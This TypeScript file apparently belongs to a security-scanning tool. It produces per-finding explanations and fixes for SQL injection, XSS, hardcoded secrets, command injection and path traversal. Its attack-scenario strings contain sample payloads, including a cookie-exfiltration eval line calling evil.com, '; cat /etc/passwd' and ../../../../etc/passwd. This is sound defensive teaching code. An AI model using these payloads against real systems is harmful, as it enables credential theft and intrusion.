/**
 * Sentinel — Contextual Explainer
 *
 * Generates context-aware vulnerability explanations using the user's actual code snippet.
 * Instead of generic "SQL injection is dangerous" text, it analyses the detected code
 * and explains specifically WHY that line is vulnerable and generates a transformed fix.
 *
 * Phase 7: This will be replaced/enhanced by the AI engine (Member 3 integration).
 */

import { SecurityFinding, VulnerabilityType } from '../analyzer/types.js';

// ─── Output Types ─────────────────────────────────────────────────────────────

export interface ContextualExplanation {
  /** Short one-line description of what was detected */
  headline: string;
  /** Specific explanation using the user's actual code */
  whyDangerous: string;
  /** A concrete attack scenario using their code */
  attackScenario: string;
  /** The user's original vulnerable code (for display) */
  vulnerableCode: string;
  /** The transformed, safe version of their specific code */
  fixedCode: string;
  /** Brief description of what the fix does */
  fixExplanation: string;
}

// ─── Main Export ──────────────────────────────────────────────────────────────

export function generateContextualExplanation(finding: SecurityFinding): ContextualExplanation {
  switch (finding.type) {
    case VulnerabilityType.SQL_INJECTION:
      return explainSqlInjection(finding);
    case VulnerabilityType.XSS:
      return explainXss(finding);
    case VulnerabilityType.HARDCODED_SECRET:
      return explainHardcodedSecret(finding);
    case VulnerabilityType.COMMAND_INJECTION:
      return explainCommandInjection(finding);
    case VulnerabilityType.PATH_TRAVERSAL:
      return explainPathTraversal(finding);
    default:
      return genericExplanation(finding);
  }
}

// ─── SQL Injection ────────────────────────────────────────────────────────────

function explainSqlInjection(finding: SecurityFinding): ContextualExplanation {
  const code = finding.codeSnippet;

  // Try to extract the variable being concatenated
  const concatVarMatch = code.match(/\+\s*(\w+)\s*;?$/);
  const concatVar = concatVarMatch ? concatVarMatch[1] : 'userInput';

  // Try to detect query type
  const queryType = /INSERT/i.test(code) ? 'INSERT' :
                    /UPDATE/i.test(code) ? 'UPDATE' :
                    /DELETE/i.test(code) ? 'DELETE' : 'SELECT';

  // Try to detect language / ORM style
  const isCSharp = /string\s+\w+\s*=/.test(code) || /var\s+\w+\s*=/.test(code);
  const isPython  = /f["']/.test(code) || code.includes('%');
  const isJS      = code.includes('`') || /const|let/.test(code);

  // Attack scenario using their variable name
  const attack = queryType === 'SELECT'
    ? `If a user sets \`${concatVar}\` to \`1 OR 1=1 --\`, the query becomes:\n` +
      `  ${buildAttackQuery(code, concatVar)}\n` +
      `This bypasses the WHERE filter and returns ALL rows in the table.`
    : `If a user sets \`${concatVar}\` to a malicious value, ` +
      `they can alter or destroy data in your database.`;

  // Generate fixed code based on detected language
  const fixedCode = buildSqlFix(code, concatVar, isCSharp, isPython, isJS);

  return {
    headline: `SQL query is built by concatenating \`${concatVar}\` directly into the string`,
    whyDangerous:
      `The variable \`${concatVar}\` is inserted directly into the SQL query string using string ` +
      `concatenation. This means whatever value \`${concatVar}\` contains becomes part of the SQL ` +
      `command itself — an attacker can craft a value that changes the query's logic.`,
    attackScenario: attack,
    vulnerableCode: code,
    fixedCode,
    fixExplanation:
      `Use a parameterized query (prepared statement). The value of \`${concatVar}\` is passed ` +
      `as a separate parameter — the database driver ensures it is treated as data, never as SQL syntax.`,
  };
}

function buildAttackQuery(code: string, varName: string): string {
  // Extract the SQL string portion and substitute the attack value
  const sqlMatch = code.match(/["'`]([^"'`]+)["'`]/);
  if (sqlMatch) {
    return sqlMatch[1] + `1 OR 1=1 --`;
  }
  return `SELECT * FROM table WHERE id=1 OR 1=1 --`;
}

function buildSqlFix(code: string, varName: string, isCSharp: boolean, isPython: boolean, isJS: boolean): string {
  // Try to extract the variable name on the left side of assignment
  const assignMatch = code.match(/(?:string|var|let|const|query)\s+(\w+)\s*=/);
  const queryVar = assignMatch ? assignMatch[1] : 'query';

  if (isCSharp) {
    // Detect the column name from WHERE clause
    const whereMatch = code.match(/WHERE\s+(\w+)\s*=/i);
    const col = whereMatch ? whereMatch[1] : 'id';
    const sqlMatch = code.match(/["']([^"']+)["']\s*\+/);
    const baseSql = sqlMatch ? sqlMatch[1].trimEnd() : `SELECT * FROM Table WHERE ${col}=`;
    // Replace concatenation with @param
    const paramSql = baseSql.replace(/=\s*["']?\s*$/, `=@${col}`);
    return (
      `// ✅ Fixed — C# parameterized query\n` +
      `string ${queryVar} = "${paramSql}";\n` +
      `using var cmd = new SqlCommand(${queryVar}, connection);\n` +
      `cmd.Parameters.AddWithValue("@${col}", ${varName});`
    );
  }

  if (isPython) {
    const whereMatch = code.match(/WHERE\s+(\w+)\s*=/i);
    const col = whereMatch ? whereMatch[1] : 'id';
    return (
      `# ✅ Fixed — Python parameterized query\n` +
      `cursor.execute(\n` +
      `    "SELECT * FROM table WHERE ${col} = %s",\n` +
      `    (${varName},)  # passed as a parameter, not concatenated\n` +
      `)`
    );
  }

  if (isJS) {
    const whereMatch = code.match(/WHERE\s+(\w+)\s*=/i);
    const col = whereMatch ? whereMatch[1] : 'id';
    return (
      `// ✅ Fixed — Node.js parameterized query\n` +
      `const ${queryVar} = "SELECT * FROM table WHERE ${col} = ?";\n` +
      `const [rows] = await connection.execute(${queryVar}, [${varName}]);`
    );
  }

  // Generic fallback
  return (
    `-- ✅ Use a parameterized query\n` +
    `-- Pass ${varName} as a bound parameter, not by concatenation\n` +
    `PREPARE stmt FROM 'SELECT * FROM table WHERE id = ?';\n` +
    `EXECUTE stmt USING @${varName};`
  );
}

// ─── XSS ──────────────────────────────────────────────────────────────────────

function explainXss(finding: SecurityFinding): ContextualExplanation {
  const code = finding.codeSnippet;

  // Detect the dangerous sink
  const isInnerHTML = /innerHTML/.test(code);
  const isEval = /\beval\s*\(/.test(code);
  const isDangerouslySet = /dangerouslySetInnerHTML/.test(code);
  const isDocWrite = /document\.write/.test(code);
  const isjQuery = /\.html\s*\(/.test(code);

  // Extract variable name being assigned
  const varMatch = code.match(/=\s*(\w+)\s*;?\s*$/) ||
                   code.match(/\((\w+)\)/) ||
                   code.match(/\{(\w+)\}/);
  const inputVar = varMatch ? varMatch[1] : 'userInput';

  // Build specific attack scenario
  let attackPayload = `<img src=x onerror="alert('XSS')">`;
  let attack = '';
  let fixedCode = '';
  let fixExplanation = '';

  if (isInnerHTML) {
    attack =
      `If \`${inputVar}\` contains:\n  ${attackPayload}\n` +
      `The browser will execute the \`onerror\` JavaScript, giving an attacker ` +
      `the ability to steal cookies, redirect users, or deface the page.`;
    fixedCode =
      `// ❌ Vulnerable\n// element.innerHTML = ${inputVar};\n\n` +
      `// ✅ Option 1 — plain text only (no HTML)\n` +
      `element.textContent = ${inputVar};\n\n` +
      `// ✅ Option 2 — sanitize if HTML is needed\n` +
      `import DOMPurify from 'dompurify';\n` +
      `element.innerHTML = DOMPurify.sanitize(${inputVar});`;
    fixExplanation =
      `\`textContent\` never parses HTML — it always treats the value as plain text. ` +
      `If you need to render HTML, use DOMPurify to strip dangerous tags before assignment.`;
  } else if (isEval) {
    attack =
      `If \`${inputVar}\` contains:\n  fetch('https://evil.com/?c='+document.cookie)\n` +
      `eval() will execute it directly, sending the user's cookies to an attacker's server.`;
    fixedCode =
      `// ❌ Never use eval() with external input\n// eval(${inputVar});\n\n` +
      `// ✅ Use JSON.parse() for data\n` +
      `const data = JSON.parse(${inputVar});\n\n` +
      `// ✅ Or rethink the architecture to avoid eval entirely`;
    fixExplanation = `JSON.parse() safely parses JSON data without executing arbitrary code.`;
  } else if (isDangerouslySet) {
    attack =
      `React's \`dangerouslySetInnerHTML\` bypasses React's XSS protection. ` +
      `If the HTML value contains \`<script>\` or event handlers, they will execute.`;
    fixedCode =
      `// ❌ Dangerous\n// dangerouslySetInnerHTML={{ __html: ${inputVar} }}\n\n` +
      `// ✅ Sanitize first\nimport DOMPurify from 'dompurify';\n` +
      `<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(${inputVar}) }} />`;
    fixExplanation = `DOMPurify removes all dangerous tags and event handlers before the HTML is rendered.`;
  } else {
    attack = `The value of \`${inputVar}\` is inserted into the page without sanitization, ` +
             `allowing an attacker to inject executable JavaScript.`;
    fixedCode =
      `// ✅ Always sanitize user input before inserting into the DOM\n` +
      `const safe = DOMPurify.sanitize(${inputVar});\n` +
      `element.innerHTML = safe;`;
    fixExplanation = `Sanitize HTML using DOMPurify before any DOM insertion.`;
  }

  return {
    headline: `User input \`${inputVar}\` is written directly into the DOM without sanitization`,
    whyDangerous:
      `The value of \`${inputVar}\` is inserted into the page as raw HTML. ` +
      `If this value comes from user input, a URL parameter, or an API response, ` +
      `an attacker can inject HTML containing JavaScript that executes in the victim's browser.`,
    attackScenario: attack,
    vulnerableCode: code,
    fixedCode,
    fixExplanation,
  };
}

// ─── Hardcoded Secret ─────────────────────────────────────────────────────────

function explainHardcodedSecret(finding: SecurityFinding): ContextualExplanation {
  const code = finding.codeSnippet;

  // Detect secret type
  const isAwsKey = /AKIA/.test(code) || /aws/i.test(code);
  const isJwt    = /eyJ/.test(code) || /jwt|token/i.test(code);
  const isApiKey = /api_?key|apikey/i.test(code);
  const isPass   = /password|passwd|pwd/i.test(code);

  // Extract variable name
  const varMatch = code.match(/(?:const|let|var|private|string)\s+(\w+)\s*=/);
  const varName = varMatch ? varMatch[1] : 'secret';

  const secretType = isAwsKey ? 'AWS Access Key' :
                     isJwt    ? 'JWT / Auth Token' :
                     isApiKey ? 'API Key' :
                     isPass   ? 'Password' : 'Secret Credential';

  return {
    headline: `${secretType} is hardcoded directly in source code as \`${varName}\``,
    whyDangerous:
      `The value of \`${varName}\` is embedded as a literal string in your source code. ` +
      `Anyone who can read this file — including teammates, open-source contributors, ` +
      `CI/CD systems, or anyone who gains access to the repository — can see and abuse this credential.`,
    attackScenario:
      `Git history permanently records every commit. Even if you delete this line tomorrow, ` +
      `the secret will remain visible in \`git log\` forever unless you rotate the credential ` +
      `AND rewrite history. GitHub's secret scanning bots actively search for patterns like this ` +
      `and notify attackers within minutes of a public push.`,
    vulnerableCode: code,
    fixedCode:
      `// ❌ Never hardcode secrets\n// ${code.trim()}\n\n` +
      `// ✅ Use an environment variable\nconst ${varName} = process.env.${varName.toUpperCase()};\n\n` +
      `// ✅ In your .env file (add .env to .gitignore!):\n` +
      `// ${varName.toUpperCase()}=<your-actual-secret>\n\n` +
      `// ✅ For production: use a secrets manager\n` +
      `// AWS Secrets Manager / Azure Key Vault / HashiCorp Vault`,
    fixExplanation:
      `Environment variables are never committed to source control. ` +
      `Use a \`.env\` file locally (excluded via \`.gitignore\`) ` +
      `and a secrets manager in production.`,
  };
}

// ─── Command Injection ────────────────────────────────────────────────────────

function explainCommandInjection(finding: SecurityFinding): ContextualExplanation {
  const code = finding.codeSnippet;
  const varMatch = code.match(/\+\s*(\w+)/) || code.match(/\$\{(\w+)\}/);
  const varName = varMatch ? varMatch[1] : 'userInput';

  return {
    headline: `Shell command is built by concatenating \`${varName}\` — possible command injection`,
    whyDangerous:
      `The variable \`${varName}\` is passed directly into a shell command. ` +
      `Shell metacharacters like \`;\`, \`&&\`, \`|\`, and backticks allow an attacker ` +
      `to chain additional commands onto yours.`,
    attackScenario:
      `If \`${varName}\` is set to:\n  legitimate_value; cat /etc/passwd\n` +
      `The shell executes BOTH your command AND the attacker's \`cat /etc/passwd\`, ` +
      `returning the server's password file. Full system compromise is possible.`,
    vulnerableCode: code,
    fixedCode:
      `// ❌ Vulnerable — string interpolation\n// exec("ping " + ${varName});\n\n` +
      `// ✅ Fixed — pass args as array, no shell\n` +
      `const { execFile } = require('child_process');\n` +
      `execFile('ping', [${varName}], (err, stdout) => {\n` +
      `  // ${varName} is now a literal argument, shell injection impossible\n` +
      `});`,
    fixExplanation:
      `\`execFile\` with an args array does NOT invoke a shell. ` +
      `The value of \`${varName}\` is passed as a literal argument — metacharacters have no effect.`,
  };
}

// ─── Path Traversal ───────────────────────────────────────────────────────────

function explainPathTraversal(finding: SecurityFinding): ContextualExplanation {
  const code = finding.codeSnippet;
  const varMatch = code.match(/\+\s*(\w+)/) || code.match(/\$\{(\w+)\}/);
  const varName = varMatch ? varMatch[1] : 'userInput';

  return {
    headline: `File path is constructed using \`${varName}\` without validation`,
    whyDangerous:
      `The path \`${varName}\` is appended to a base directory without checking whether ` +
      `the resulting path stays inside the intended directory. ` +
      `An attacker can use \`../\` sequences to escape the directory.`,
    attackScenario:
      `If \`${varName}\` is set to:\n  ../../../../etc/passwd\n` +
      `Your code will read \`/etc/passwd\` — the server's user account file — ` +
      `instead of the intended file. This exposes sensitive system files.`,
    vulnerableCode: code,
    fixedCode:
      `const path = require('path');\n\n` +
      `// ❌ Vulnerable\n// fs.readFileSync(baseDir + ${varName});\n\n` +
      `// ✅ Fixed — validate the resolved path\n` +
      `const baseDir = path.resolve('./uploads');\n` +
      `const resolved = path.resolve(baseDir, ${varName});\n\n` +
      `if (!resolved.startsWith(baseDir + path.sep)) {\n` +
      `  throw new Error('Path traversal attempt blocked');\n` +
      `}\n` +
      `fs.readFileSync(resolved); // safe`,
    fixExplanation:
      `\`path.resolve()\` normalises \`../\` sequences. ` +
      `Checking that the result starts with the base directory ensures the file is inside the allowed folder.`,
  };
}

// ─── Generic Fallback ─────────────────────────────────────────────────────────

function genericExplanation(finding: SecurityFinding): ContextualExplanation {
  return {
    headline: `${finding.type.replace(/_/g, ' ')} detected`,
    whyDangerous: finding.message,
    attackScenario: `An attacker exploiting this vulnerability could compromise the security of the application.`,
    vulnerableCode: finding.codeSnippet,
    fixedCode: `// Refer to OWASP guidelines for ${finding.type.replace(/_/g, ' ')} remediation`,
    fixExplanation: `Follow secure coding practices for this vulnerability type.`,
  };
}
